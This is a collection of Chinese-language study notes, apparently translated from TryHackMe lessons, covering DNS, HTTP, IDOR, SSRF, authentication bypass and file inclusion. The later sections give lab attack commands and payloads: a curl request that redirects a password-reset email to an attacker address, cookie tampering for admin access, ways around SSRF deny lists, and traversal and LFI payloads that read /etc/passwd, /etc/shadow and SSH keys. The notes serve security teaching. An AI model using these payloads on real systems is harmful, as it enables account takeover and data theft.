[{"content":"DNS详细信息 DNS（域名系统）为我们提供了一种与 Internet 上的设备进行通信的简单方法，而无需记住复数。就像每栋房子都有一个直接向其发送邮件的唯一地址一样，互联网上的每台计算机都有自己唯一的地址来与之通信，称为 IP 地址。IP 地址类似于以下 104.26.10.229,4 组数字，范围从 0 到 255，用句点分隔。当您想访问一个网站时，记住这组复杂的数字并不十分方便，而这正是 DNS 可以提供帮助的地方。因此，您可以记住 tryhackme.com，而不是记住 104.26.10.229。\n域层次结构 TLD （顶级域名） TLD 是域名最右侧的部分。因此，例如，tryhackme.com TLD 是 .com。TLD 有两种类型，gTLD（通用顶级域名）和 ccTLD（国家代码顶级域名）。从历史上看，gTLD 旨在告诉用户域名的用途;例如，.com 用于商业目的，.org 用于组织，.edu 用于教育，.gov 用于政府。ccTLD 用于地理目的，例如 .ca 表示位于加拿大的站点，.co.uk 表示位于英国的站点，依此类推。由于这种需求，涌入了从 .online 、 .club 、 .website 、 .biz 等 新 gTLD 。\n二级域 以 tryhackme.com 为例，.com部分是 TLD，tryhackme 是二级域名。注册域名时，二级域名限制为 63 个字符 + TLD，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾或有连续的连字符）。\n子域 子域位于二级域的左侧，使用句点分隔它;例如，在 name admin.tryhackme.com 中，admin 部分是 subdomain。子域名的创建限制与二级域名相同，限制为 63 个字符，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾，也不能有连续的连字符）。您可以使用多个子域（用句点拆分）来创建更长的名称，例如 jupiter.servers.tryhackme.com。但长度必须保持在 253 个字符或更少。您可以为域名创建的子域数量没有限制。\n","date":"2025-03-19T00:00:00Z","permalink":"https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/","title":"DNS 详细信息"},{"content":"HTTP协议 什么是 HTTP？（超文本传输协议） HTTP 是您查看网站时使用的工具，由 Tim Berners-Lee 和他的团队在 1989 年至 1991 年间开发。HTTP 是用于与 Web 服务器通信以传输网页数据（无论是 HTML、图像、视频等）的规则集。\n什么是 HTTPS？ （安全超文本传输协议） HTTPS 是 HTTP 的安全版本。 HTTPS 数据是加密的，因此它不仅可以阻止人们看到您接收和发送的数据，还可以确保您正在与正确的 Web 服务器通信，而不是冒充它。\n什么是 URL？（统一资源定位器） 如果您曾经使用过 Internet，那么您以前也使用过 URL。URL 主要是有关如何访问 Internet 上的资源的指令。下图显示了 URL 及其所有功能的外观（它不会在每个请求中使用所有功能）。\nScheme:这指示使用什么协议来访问资源，例如 HTTP、HTTPS、FTP（文件传输协议）。 **User:**某些服务需要身份验证才能登录，您可以在 URL 中输入用户名和密码才能登录。 **Host:**您要访问的服务器的域名或 IP 地址。 **Port:**您要连接的端口，通常为 80 用于 HTTP，443 用于 HTTPS，但这可以托管在 1 - 65535 之间的任何端口上。 **Path:**您尝试访问的资源的文件名或位置。 **Query String:**可以发送到请求路径的额外信息位。例如，/blog？id=1 将告知博客路径您希望接收 ID 为 1 的博客文章。 Fragment: 这是对请求的实际页面上的位置的引用。这通常用于内容较长的页面，并且可以将页面的某个部分直接链接到该页面，因此用户一旦访问该页面即可查看该页面。 提出请求 只需一行 GET / HTTP/1.1 就可以向 Web 服务器发出请求\n但要获得更丰富的 Web 体验，您还需要发送其他数据。这些其他数据以所谓的 headers 形式发送，其中 header 包含额外的信息，以提供给您正在与之通信的 Web 服务器，但我们将在 Header 任务中对此进行更多介绍。\n请求示例：\n1 2 3 4 5 6 7 8 9 10 GET / HTTP/1.1 Host: tryhackme.com User-Agent: Mozilla/5.0 Firefox/87.0 Referer: https://tryhackme.com/ 第 1 行： 此请求将发送 GET 方法（ 在 HTTP 方法 任务中，有更多相关信息），请求带有 / 的主页，并告知 Web 服务器我们使用的是 HTTP 协议版本 1.1。\n第 2 行： 我们告诉 Web 服务器我们希望网站 tryhackme.com\n第 3 行： 我们告诉 Web 服务器我们使用的是 Firefox 版本 87 浏览器\n第 4 行： 我们告诉 Web 服务器，将我们引荐到此网页的网页是 https://tryhackme.com\n**第 5 行：**HTTP 请求始终以空行结尾，以通知 Web 服务器请求已完成。\n响应示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 HTTP/1.1 200 OK Server: nginx/1.15.8 Date: Fri, 09 Apr 2021 13:34:03 GMT Content-Type: text/html Content-Length: 98 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;TryHackMe\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Welcome To TryHackMe.com \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 第 1 行： HTTP 1.1 是服务器正在使用的 HTTP 协议版本，然后是 HTTP 状态代码（在本例中为“200 Ok”），这告诉我们请求已成功完成。\n第 2 行： 这告诉我们 Web 服务器软件和版本号。\n第 3 行： Web 服务器的当前日期、时间和时区。\n第 4 行： Content-Type 标头告诉客户端将发送哪种信息，例如 HTML、图像、视频、pdf、XML。\n第 5 行： Content-Length 告诉客户端响应多长时间，这样我们就可以确认没有丢失数据\n**第 6 行：**HTTP 响应包含一个空行，用于确认 HTTP 响应的结束。\n第 7-14 行： 已请求的信息，在本例中为主页。\nHTTP方法 GET Request 这用于从 Web 服务器获取信息。\nPOST Request 这用于将数据提交到 Web 服务器并可能创建新记录\nPUT Request 这用于将数据提交到 Web 服务器以更新信息\nDELETE Request 这用于从 Web 服务器中删除信息/记录。\nHTTP 协议状态代码： 在上一个任务中，您了解到，当 HTTP 服务器响应时，第一行始终包含一个状态代码，告知客户端其请求的结果以及可能如何处理该请求。这些状态代码可以分为 5 个不同的范围：\n100-199 - Information Response 100-199 - 信息响应 发送这些请求是为了告诉客户端其请求的第一部分已被接受，他们应该继续发送请求的其余部分。这些代码不再很常见。 200-299 - 成功 此状态代码范围用于告诉客户端其请求成功。 300-399 - 重定向 这些用于将客户端的请求重定向到另一个资源。这可以是不同的网页，也可以是完全不同的网站。 400-499 - Client Errors 400-499 - 客户端错误 用于通知客户端其请求有错误。 500-599 - 服务器错误 这是为服务器端发生的错误保留的，通常表示处理请求的服务器存在相当大的问题。 常见的 HTTP 状态代码： 有很多不同的 HTTP 状态代码，这还不包括应用程序甚至可以定义自己的 HTTP 状态代码，我们将介绍您可能遇到的最常见的 HTTP 响应：\n200 - OK 200 - 正常 请求已成功完成。 201 - Created 201 - 已创建 已创建资源（例如，新用户或新博客文章）。 301 - Moved Permanently 301 - 永久移动 这会将客户的浏览器重定向到新网页，或告诉搜索引擎该页面已移至其他位置并改为查看那里。 302 - Found 302 - 找到 与上述永久重定向类似，但顾名思义，这只是一个临时更改，在不久的将来可能会再次更改。 400 - Bad Request 400 - 错误请求 这会告诉浏览器他们的请求中有错误或缺失。如果请求的 Web 服务器资源需要客户端未发送的特定参数，则有时可以使用此方法。 401 - Not Authorised 401 - 未授权 在您授权 Web 应用程序（通常是使用用户名和密码）之前，您当前不允许查看此资源。 403 - Forbidden 403 - 禁止 无论您是否登录，您都无权查看此资源。 405 - Method Not Allowed 405 - 不允许使用 资源不允许此方法请求，例如，当资源需要 POST 请求时，您向资源 /create-account 发送 GET 请求。 404 - Page Not Found 404 - 未找到页面 您请求的页面/资源不存在。 500 - Internal Service Error 500 - 内部服务错误 服务器在您的请求中遇到了某种错误，它不知道如何正确处理。 503 - Service Unavailable 503 - 服务不可用 此服务器无法处理您的请求，因为它已过载或停机进行维护。 Headers 头 标头是您在发出请求时可以发送到 Web 服务器的附加数据位。\n尽管在发出 HTTP 请求时不严格要求标头，但您会发现很难正确查看网站。\n通用请求标头 这些是从客户端（通常是您的浏览器）发送到服务器的标头。\nHost: 一些 Web 服务器托管多个网站，因此通过提供主机标头，您可以告诉它您需要哪个网站，否则您只会收到服务器的默认网站。\n**User-Agent:**这是您的浏览器软件和版本号，告诉 Web 服务器您的浏览器软件有助于它为您的浏览器正确格式化网站，并且 HTML、JavaScript 和 CSS 的某些元素仅在某些浏览器中可用。\n**Content-Length:**将数据发送到 Web 服务器（例如在表单中）时，内容长度会告知 Web 服务器 Web 请求中预期有多少数据。这样，服务器可以确保它不会丢失任何数据。\n**Accept-Encoding:**告诉 Web 服务器浏览器支持哪些类型的压缩方法，以便可以缩小数据以通过 Internet 传输。\n**Cookie:**发送到服务器以帮助记住您的信息的数据（有关更多信息，请参阅 Cookie 任务）。\n常见响应标头 这些是在请求后从服务器返回给客户端的标头。\n**Set-Cookie:**要存储的信息将在每个请求中发送回 Web 服务器（请参阅 cookie 任务以了解更多信息）。\n**Cache-Control:**在浏览器再次请求响应之前，将响应内容存储在浏览器的缓存中多长时间。\nContent-Type: 这会告诉客户端返回什么类型的数据，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用 content-type 标头，浏览器就可以知道如何处理数据。\n**Content-Encoding:**通过 Internet 发送数据时，使用了什么方法来压缩数据以使其更小。\nCookies 它们只是存储在您计算机上的一小段数据。当您从 Web 服务器收到 “Set-Cookie” 标头时，将保存 Cookie。然后，您发出的每个进一步请求，您都会将 cookie 数据发送回 Web 服务器。由于 HTTP 是无状态的（不会跟踪您以前的请求），因此 cookie 可用于提醒 Web 服务器您是谁、网站的一些个人设置或您以前是否访问过该网站。让我们看一下这个 HTTP 请求示例：\nCookie 可用于多种用途，但最常用于网站身份验证。cookie 值通常不是您可以看到密码的明文字符串，而是令牌（人类不容易猜到的唯一密码）。\n查看您的 Cookie 您可以在浏览器中使用开发人员工具轻松查看浏览器向网站发送的 Cookie。\n打开开发人员工具后，单击“Network”（网络）选项卡。此选项卡将向您显示浏览器请求的所有资源的列表。您可以单击每个选项以接收请求和响应的详细分类。如果您的浏览器发送了 Cookie，您将在请求的“Cookie”选项卡上看到这些 Cookie。\n","date":"2025-03-19T00:00:00Z","permalink":"https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/","title":"HTTP 详细信息"},{"content":"IDOR基础 什么是IDOR IDOR（ Insecure Direct Object Reference） 代表不安全的直接对象引用，是一种访问控制漏洞。\n当 Web 服务器收到用户提供的输入以检索对象（文件、数据、文档），对输入数据给予了太多信任，并且未在服务器端对其进行验证以确认所请求的对象属于请求它的用户时，就会发生这种类型的漏洞。\n示例 假设您刚刚注册了一项在线服务，并且想要更改您的个人资料信息。您单击的链接将转到 http://online-service.thm/profile?user_id=1305，您可以看到您的信息。\n好奇心让您尝试将 user_id 值更改为 1000 （http://online-service.thm/profile?user_id=1000），令您惊讶的是，您现在可以看到其他用户的信息。您现在发现了一个 IDOR 漏洞！理想情况下，应该在网站上进行检查，以确认用户信息属于请求它的用户。\n在编码中发现IDOR 当通过帖子数据、查询字符串或 cookie 将数据从一个页面传递到另一个页面时，Web 开发人员通常首先会获取原始数据并对其进行编码。编码可确保接收 Web 服务器能够理解内容。编码将二进制数据转换为 ASCII 字符串，通常使用 a-z、A-Z、0-9 和 = 字符 用于填充。Web 上最常见的编码技术是 base64 编码，通常很容易被发现。您可以使用网站 Like https://www.base64decode.org/ 解码字符串，然后编辑数据并使用 https://www.base64encode.org/ 再次重新编码，然后重新提交 Web 请求以查看响应是否有更改。\n请参阅下图作为此过程的图形示例：\n哈希IDOR 散 列 ID 比编码的 ID 要复杂一些，但它们可能遵循可预测的模式，例如是整数值的哈希版本。例如，如果使用 md5 哈希，则 ID 号 123 将变为 202cb962ac59075b964b07152d234b70。\n值得将任何发现的哈希值通过 Web 服务，例如 https://crackstation.net/（它有一个包含数十亿个 hash to value 结果的数据库），看看我们是否能找到任何匹配项。\nUnpredictable IDs 如果使用上述方法无法检测到 ID，则 IDOR 检测的一个很好的方法是创建两个帐户并在它们之间交换 ID 号。如果您可以使用其他用户的 ID 号查看其他用户的内容，同时仍然使用其他账户登录（或根本未登录），则您发现了有效的 IDOR 漏洞。\nIDOR在哪里 您所针对的易受攻击的终端节点可能并不总是您在地址栏中看到的。它可能是您的浏览器通过 AJAX 请求加载的内容，或者您在 JavaScript 文件中找到引用的内容。\n有时，终端节点可能有一个未引用的参数，该参数可能在开发过程中有所用处，并被推送到生产环境中。例如，您可能会注意到对 /user/details 的调用显示您的用户信息（通过您的会话进行身份验证）。但是通过一种称为参数挖掘的攻击，您发现了一个名为 user_id 的参数，您可以使用它来显示其他用户的信息，例如 /user/details？user_id=123\n","date":"2025-03-19T00:00:00Z","permalink":"https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/","title":"IDOR基础"},{"content":"SSRF基础 什么是SSRF SSRF 代表服务器端请求伪造。这是一个漏洞，允许恶意用户使 Web 服务器向攻击者选择的资源发出额外或经过编辑的 HTTP 请求。\nSSRF 的类型 SSRF 漏洞有两种类型;第一个是常规 SSRF，其中数据返回到攻击者的屏幕。第二个是盲目 SSRF 漏洞，其中发生了 SSRF，但没有信息返回到攻击者的屏幕。\n影响是什么？ 成功的 SSRF 攻击可能导致以下任何情况：\n进入未经授权的区域。 访问客户/组织数据。 能够扩展到内部网络。 显示身份验证令牌/凭据。 查找SSRF漏洞 可以通过多种不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。以下是四个常见位置的示例：\n当地址栏的参数中使用完整 URL 时：\n表单中的隐藏字段：\n部分 URL，例如主机名：\n或者可能只是 URL 的路径：\n其中一些示例比其他示例更容易被利用，因此需要进行大量试验和错误才能找到有效的有效负载。\n如果使用盲 SSRF，并且没有输出反射给您，则需要使用外部 HTTP 日志记录工具来监控请求，例如 requestbin.com、您自己的 HTTP 服务器或 Burp Suite 的协作者客户端。\n常见的防御手段与应对 更了解安全漏洞的开发人员意识到 SSRF 漏洞的风险，可以在其应用程序中实施检查，以确保请求的资源符合特定规则。通常有两种方法，拒绝列表或允许列表。\n拒绝列表 在拒绝列表 （Deny List） 中，接受除列表中指定的资源或与特定模式匹配的资源之外的所有请求。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是 localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1 等域名会出现在拒绝列表中。攻击者可以使用替代本地主机引用绕过拒绝列表，例如 0、0.0.0.0、0000、127.1、127...*、2130706433、017700000001 或具有解析为 IP 地址 127.0.0.1 的 DNS 记录的子域，例如 127.0.0.1.nip.io。\n此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域来绕过此问题，该子域的 DNS 记录指向 IP 地址 169.254.169.254。\n允许列表 在允许列表中，除非所有请求都显示在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 https://website.thm 开头的规则，否则所有请求都会被拒绝。攻击者可以通过在攻击者的域名上创建子域（例如 https://website.thm.attackers-domain.thm）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部 HTTP 请求。\n打开重定向 如果上述绕过不起作用，那么攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会在其中自动重定向到另一个网站地址。以 link https://website 为例。thm/link？url=https：//tryhackme.com 的创建此端点是为了记录访客出于广告/营销目的点击此链接的次数。但是想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 https://website 开头的 URL。thm/。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。\n","date":"2025-03-19T00:00:00Z","permalink":"https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/","title":"SSRF基础"},{"content":"身份验证绕过 用户名枚举 暴力 逻辑缺陷 什么是逻辑缺陷？ 有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或纵。逻辑缺陷可以存在于网站的任何区域，但在这种情况下，我们将专注于与身份验证相关的示例。\n逻辑缺陷示例 下面的模拟代码示例检查客户端正在访问的路径的开头是否以 /admin 开头，如果是，则进行进一步检查以查看客户端是否实际上是 admin。如果页面不以 /admin 开头，则会向客户端显示该页面。\n1 2 3 4 5 if( url.substr(0,6) === \u0026#39;/admin\u0026#39;) { # Code to check user is an admin } else { # View Page } 因为上面的 PHP 代码示例使用了三个等号 （===），所以它正在查找字符串的完全匹配项，包括相同的字母大小写。该代码存在逻辑缺陷，因为请求 /adMin 的未经身份验证的用户将不会检查其权限，而是向他们显示页面，从而完全绕过身份验证检查。\n逻辑缺陷实用 我们将检查 Acme IT 支持网站 （http：//MACHINE_IP/customers/reset） 的重置密码 功能。我们看到一个表单，要求提供与我们希望执行密码重置的账户关联的电子邮件地址。如果输入的电子邮件无效，您将收到错误消息Account not found from provided email address\n出于演示目的，我们将使用 email address robert@acmeitsupport.thm被接受。然后，我们会看到表单的下一阶段，该阶段要求提供与此登录电子邮件地址关联的用户名。如果我们输入 robert 作为用户名并按下 Check Username 按钮，您将看到一条确认消息，告知将向 robert@acmeitsupport.thm发送一封密码重置电子邮件。\n在此阶段，您可能想知道此应用程序中的漏洞可能是什么，因为您必须知道电子邮件和用户名，然后将密码链接发送到帐户所有者的电子邮件地址。\n在重置电子邮件过程的第二步中，用户名在 POST 字段中提交到 Web 服务器，电子邮件地址在查询字符串请求中作为 GET 字段发送。\n让我们通过使用 curl 工具手动向 Web 服务器发出请求来说明这一点。\n1 user@tryhackme$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026#39; 我们使用该标志向请求添加额外的标头。在这种情况下，我们将 设置为 ，这让 Web 服务器知道我们正在发送表单数据，以便它正确理解我们的请求。\n在应用程序中，使用查询字符串检索用户帐户，但稍后，在应用程序逻辑中，使用 PHP 变量 $_REQUEST 中的数据发送密码重置电子邮件。\nPHP$_REQUEST 变量是一个数组，其中包含从查询字符串接收的数据和 POST 数据。如果查询字符串和 POST 数据使用相同的键名称，则此变量的应用程序逻辑优先使用 POST 数据字段而不是查询字符串，因此，如果我们向 POST 表单添加另一个参数，我们可以控制密码重置电子邮件的发送位置。\n1 user@tryhackme$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026amp;email=attacker@hacker.com\u0026#39; **下一步，您需要在 Acme IT 支持客户部分创建一个帐户，这样做会为您提供一个可用于创建支持票证的唯一电子邮件地址。电子邮件地址的格式为 {username}@customer.acmeitsupport.thm\n现在重新运行 Curl 请求 2，但使用您的 @acmeitsupport。thm 在电子邮件字段中，您将在您的帐户上创建一个票证，其中包含一个链接，用于以 Robert 身份登录。使用 Robert 的帐户，您可以查看他们的支持票证并显示标志。\n1 user@tryhackme:~$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026amp;email={username}@customer.acmeitsupport.thm\u0026#39; Cookie 篡改 在联机会话期间检查和编辑 Web 服务器设置的 Cookie 可能会产生多种结果，例如未经身份验证的访问、访问其他用户帐户或提升的权限。\n纯文本 某些 cookie 的内容可以是纯文本形式，并且它们的作用很明显。例如，如果这些是成功登录后设置的 Cookie：\n1 2 Set-Cookie: logged_in=true; Max-Age=3600; Path=/ Set-Cookie: admin=false; Max-Age=3600; Path=/ 我们看到一个 Cookie （logged_in），它似乎用于控制用户当前是否登录，以及另一个 （admin），它控制访客是否具有管理员权限。使用这个逻辑，如果我们要更改 cookie 的内容并发出请求，我们将能够更改我们的权限。\n首先，我们先请求目标页面：\n1 user@tryhackme$ curl http://MACHINE_IP/cookie-test 我们可以看到我们返回了一条消息：Not Logged In\n现在，我们将发送另一个请求，其中 logged_in Cookie 设置为 true，管理 Cookie 设置为 false：\n1 user@tryhackme$ curl -H \u0026#34;Cookie: logged_in=true; admin=false\u0026#34; http://MACHINE_IP/cookie-test 我们收到消息：Logged In As A User\n最后，我们将发送最后一个请求，将 logged_in 和 admin Cookie 都设置为 true：\n1 user@tryhackme$ curl -H \u0026#34;Cookie: logged_in=true; admin=true\u0026#34; http://MACHINE_IP/cookie-test 这将返回结果：Logged In As An Admin\nHashing 散列法 有时 Cookie 值看起来像一长串随机字符;这些称为哈希，它是原始文本的不可逆表示。以下是您可能会遇到的一些示例：\n原始字符串 ** 哈希方法** 输出 1 md5 c4ca4238a0b923820dcc509a6f75849b 1 sha-256 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b 1 sha-512 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a 1 sha1 356a192b7913b04c54574d18c28d46e6395428ab 从上表中可以看出，同一输入字符串的哈希输出可能会因使用的哈希方法而显著不同。即使哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 https://crackstation.net/ 等服务会保留数十亿个哈希及其原始字符串的数据库。\n编码 编码类似于哈希，因为它会创建看似随机的文本字符串，但实际上，编码是可逆的。所以这就引出了一个问题，编码的意义何在？编码使我们能够将二进制数据转换为人类可读的文本，这些文本可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。\n常见的编码类型包括 base32 和 base64，前者将二进制数据转换为字符 A-Z 和 2-7，后者使用字符 a-z、A-Z、0-9、+ 和 equals 符号进行转换进行填充。\n以以下数据为例，该数据由 Web 服务器在登录时设置：\n1 Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/ 这个字符串 base64 解码的值为 {“id”：1，“admin”： false} ，然后我们可以再次将其编码回 base64 编码，但将 admin 值设置为 true，这现在为我们提供了管理员访问权限。\n","date":"2025-03-19T00:00:00Z","permalink":"https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/","title":"身份验证绕过"},{"content":"文件包含基础 介绍 此房间旨在为您提供利用文件包含漏洞的基本知识，包括本地文件包含 （LFI）、远程文件包含 （RFI） 和目录遍历。此外，我们还将讨论发现这些漏洞的风险以及所需的补救措施。我们提供了每个漏洞的一些实际示例以及实践挑战。\n在某些情况下，编写 Web 应用程序是为了通过参数请求访问给定系统上的文件，包括图像、静态文本等。参数是附加到 URL 的查询参数字符串，可用于检索数据或根据用户输入执行作。 下图分解了 URL 的基本部分。\n例如，参数用于 Google 搜索，其中 GET 请求将用户输入传递到搜索引擎中。 https://www.google.com/search?q=TryHackMe。\n让我们讨论一个用户请求从 Web 服务器访问文件的场景。首先，用户向 Web 服务器发送一个 HTTP 请求，其中包含要显示的文件。例如，如果用户想要在 Web 应用程序中访问和显示其 CV，则请求可能如下所示，http://webapp.thm/get.php?file=userCV.pdf，其中 file 是参数，userCV.pdf是要访问的必需文件。\n为什么会出现文件包含漏洞？ 文件包含漏洞通常在 Web 应用程序（如 PHP ）的各种编程语言 中发现和利用，这些应用程序编写和实现都很糟糕。这些漏洞的主要问题是输入验证，其中用户输入没有经过清理或验证，由用户控制它们。当输入未经过验证时，用户可以将任何输入传递给函数，从而导致漏洞。\n文件包含有什么风险？ 默认情况下，攻击者可以利用文件包含漏洞来泄露数据，例如代码、凭据或与 Web 应用程序或作系统相关的其他重要文件。此外，如果攻击者可以通过任何其他方式将文件写入服务器，则文件包含可能会协同使用以获得远程命令执行 （RCE）。\n路径遍历 也称为目录遍历，允许攻击者读取作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过纵和滥用 Web 应用程序的 URL 来查找和访问存储在应用程序根目录之外的文件或目录，从而利用此漏洞。\n当用户的输入传递到 PHP 中的 file_get_contents 等函数时，会出现路径遍历漏洞。请务必注意，该函数并不是导致此漏洞的主要因素。通常，糟糕的输入验证或筛选是导致此漏洞的原因。在 PHP 中，您可以使用 file_get_contents 读取文件的内容。\n下图显示了 Web 应用程序如何在 /var/www/app 中存储文件。满意的路径是用户请求 从定义的路径 /var/www/app/CVs userCV.pdf。\n我们 可以通过添加有效负载来测试 URL 参数，以查看 Web 应用程序的行为方式。路径遍历攻击，也称为点-点-斜杠攻击，利用双点将目录上移一步。 如果攻击者找到入口点，在本例中为 get.php?file=，那么攻击者可能会发送如下内容 http://webapp.thm/get.php?file=../../../../etc/passwd\n假设没有输入验证，而不是访问 PDF 文件位于 /var/www/app/CVs 位置，则 Web 应用程序会从其他 目录，在本例中为 /etc/passwd。每个 .. 条目都会移动一个目录，直到到达根目录 /。然后，它将目录更改为 /etc，然后从那里读取 passwd 文件。\n因此，Web 应用程序将文件的内容发送回给用户。\n同样，如果 Web 应用程序在 Windows 服务器上运行，攻击者需要提供 Windows 路径。例如，如果攻击者想要读取位于c:\\boot.ini 中的 boot.ini 文件，则攻击者可以根据目标尝试以下作 作系统版本：\n1 2 3 http://webapp.thm/get.php?file=../../../../boot.ini 或 http://webapp.thm/get.php?file=../../../../windows/win.ini 与 Linux作系统相同的概念在这里适用，在这种作系统中，我们爬上目录直到它到达根目录，这通常是 .\n有时，开发人员会添加过滤器以限制仅访问某些文件或目录。以下是测试时可以使用的一些常见作系统文件。\n位置 描述 /etc/issue 包含要在登录提示之前打印的消息或系统标识。 /etc/profile 控制系统范围的默认变量，如导出变量、文件创建掩码 （umask）、终端类型、邮件消息，以指示新邮件何时到达 /proc/version 指定 Linux 内核的版本 etc/passwd 等/passwd 具有有权访问系统的所有注册用户 /etc/shadow 包含有关系统用户密码的信息 /root/.bash_history 包含 root 用户的 history 命令 /var/log/dmessage 包含全局系统消息，包括系统启动期间记录的消息 `/var/mail/root 根用户的所有电子邮件 /root/.ssh/id_rsa 服务器上 root 或任何已知有效用户的私有 SSH 密钥 /var/log/apache2/access.log Web 服务器的访问请求 C:\\boot.ini C：\\boot.ini 包含具有 BIOS 固件的计算机的启动选项 本地文件包含 LFI 一 针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。使用 PHP 时，使用 include、require、include_once 和 require_once 等功能通常会导致 Web 应用程序易受攻击。在这个房间里，我们将挑选 PHP，但值得注意的是，使用其他语言（如 ASP、JSP）甚至在 Node.js 应用程序中也会出现 LFI 漏洞。LFI 漏洞利用遵循与路径遍历相同的概念。\n1 2 3 \u0026lt;?PHP include($_GET[\u0026#34;lang\u0026#34;]); ?\u0026gt; 上面的 PHP 代码通过 URL 参数 lang 使用 GET 请求来包含页面的文件。可以通过发送以下 HTTP 请求来完成调用，如下所示：http://webapp.thm/index.php?lang=EN.php 加载英文页面或 http://webapp.thm/index.php?lang=AR.php加载阿拉伯语页面，其中 EN.php 和 AR.php文件位于同一目录中。\n理论上，如果没有任何输入验证，我们可以从上面的代码中访问和显示服务器上的任何可读文件。假设我们想读取 /etc/passwd 文件，其中包含有关 Linux作系统用户的敏感信息，我们可以尝试以下作：http://webapp.thm/get.php?file=/etc/passwd\n在这种情况下，它之所以有效，是因为 include 函数中没有指定目录，也没有输入验证。\n二 接下来，在下面的代码中，开发人员决定指定函数内部的目录。\n1 2 3 \u0026lt;?PHP include(\u0026#34;languages/\u0026#34;. $_GET[\u0026#39;lang\u0026#39;]); ?\u0026gt; 在上面的代码中，开发者决定使用 include 函数，只通过 lang 参数调用 languages 目录下的 PHP 页面。\n如果没有输入验证，攻击者可以通过将 lang 输入替换为其他作系统敏感文件（如 /etc/passwd）来纵 URL。\n同样，有效负载看起来类似于路径遍历，但 include 函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：\n1 http://webapp.thm/index.php?lang=../../../../etc/passwd 本地文件包含 LFI2 在这项任务中，我们将更深入地了解 LFI。我们讨论了在 include 函数中绕过过滤器的几种技术。\n在前两种情况下，我们检查了 Web 应用程序的代码，然后我们知道如何利用它。但是，在本例中，我们正在执行黑盒测试，其中我们没有源代码。在这种情况下，错误对于了解数据如何传递和处理到 Web 应用程序中非常重要。\n在此方案中，我们有以下入口点： http://webapp.thm/index.php?lang=EN 。如果我们输入无效的输入（例如 THM），则会收到以下错误\n1 Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12 错误消息泄露了重要信息。输入 THM 作为输入后，将显示一条错误消息，显示 include 函数的外观：include（languages/THM.php）;。\n如果你仔细查看该目录，我们可以看出 functions includes files in the languages 目录正在添加 .php 的 API 文件。因此，有效的输入将如下所示：index.php？lang=EN，其中文件 EN 位于给定的语言目录中，名为 EN。php 的\n此外，错误消息还泄露了有关完整 Web 应用程序目录路径的另一条重要信息，即 /var/www/html/THM-4/\n要利用这一点，我们需要使用 ../ 技巧，如 目录遍历 部分所述，以导出当前文件夹。让我们尝试以下作：\n1 http://webapp.thm/index.php?lang=../../../../etc/passwd 请注意，我们使用了 4 ../ 因为我们知道该路径有四个级别 /var/www/html/THM-4。但我们仍然收到以下错误：\n1 Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12 似乎我们可以移出 PHP 目录，但是 include 函数仍然使用 .PHP 最后！这告诉我们开发人员指定要传递给 include 函数的文件类型。要绕过这种情况，我们可以使用 NULL BYTE，即 %00。\n使用空字节是一种注入技术，其中 URL 编码的表示形式（如 %00 或 0x00）以十六进制表示形式与用户提供的数据一起终止字符串。您可以将其视为试图欺骗 Web 应用程序忽略 Null Byte 之后的任何内容。\n通过在有效负载的末尾添加 Null Byte，我们告诉 include 函数忽略 null 字节之后的任何内容，这可能如下所示：\n1 include(\u0026#34;languages/../../../../../etc/passwd%00\u0026#34;).\u0026#34;.php\u0026#34;); `等同于 `include(\u0026#34;languages/../../../../../etc/passwd\u0026#34;); 注意： %00 技巧是固定的，不适用于 PHP 